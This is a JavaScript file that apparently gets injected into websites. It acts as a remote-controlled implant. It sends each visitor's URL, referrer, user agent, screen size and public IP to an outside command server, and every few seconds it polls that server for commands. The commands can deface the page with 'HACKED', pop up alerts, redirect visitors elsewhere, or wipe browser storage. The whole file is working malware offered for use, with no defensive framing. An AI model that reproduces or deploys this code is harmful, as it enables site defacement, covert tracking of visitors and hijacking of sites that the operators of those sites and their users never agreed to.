/**
 * X-Coder System v9.0 - FINAL
 */

(function() {
    'use strict';

    // ============================================================
    // GANTI DENGAN URL INDEX.PHP ANDA!
    // ============================================================
    var SERVER = 'https://nexaisback.itsmeher.my.id/sec.php';

    function getDomain() {
        return window.location.hostname;
    }

    // ============================================================
    // KIRIM DATA KE SERVER
    // ============================================================
    function sendData() {
        var data = {
            domain: getDomain(),
            url: window.location.href,
            path: window.location.pathname,
            title: document.title,
            referrer: document.referrer || 'Direct',
            userAgent: navigator.userAgent,
            screen: screen.width + 'x' + screen.height,
            timestamp: new Date().toISOString(),
            ip: ''
        };

        // Ambil IP
        try {
            fetch('https://api.ipify.org?format=json')
                .then(function(r) { return r.json(); })
                .then(function(r) { data.ip = r.ip; })
                .catch(function() {});
        } catch(e) {}

        // Kirim ke server
        try {
            fetch(SERVER, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(function() {});
        } catch(e) {}
    }

    // ============================================================
    // CEK PERINTAH (POLLING SETIAP 5 DETIK)
    // ============================================================
    function checkCommand() {
        try {
            var domain = getDomain();
            var url = SERVER + '?cmd=get&domain=' + encodeURIComponent(domain);
            
            fetch(url)
                .then(function(r) { return r.json(); })
                .then(function(response) {
                    if (response && response.command) {
                        executeCommand(response.command, response);
                    }
                })
                .catch(function() {});
        } catch(e) {}
    }

    // ============================================================
    // EKSEKUSI PERINTAH
    // ============================================================
    function executeCommand(command, data) {
        console.log('📡 Command:', command);
        
        switch(command) {
            case 'deface':
                document.documentElement.innerHTML = data.html || '<h1 style="text-align:center;margin-top:20%;color:red;">HACKED</h1>';
                break;
            case 'alert':
                alert(data.message || '⚠️ Security Alert!');
                break;
            case 'redirect':
                window.location.href = data.url || 'https://www.roblox.com/home';
                break;
            case 'clear':
                localStorage.clear();
                sessionStorage.clear();
                alert(data.message || 'Storage cleared!');
                break;
        }
    }

    // ============================================================
    // JALANKAN
    // ============================================================
    setTimeout(sendData, 1000);
    setInterval(sendData, 30000);
    setInterval(checkCommand, 5000); // Cek setiap 5 detik

    console.log('🔍 X-Coder System started on:', getDomain());
})();
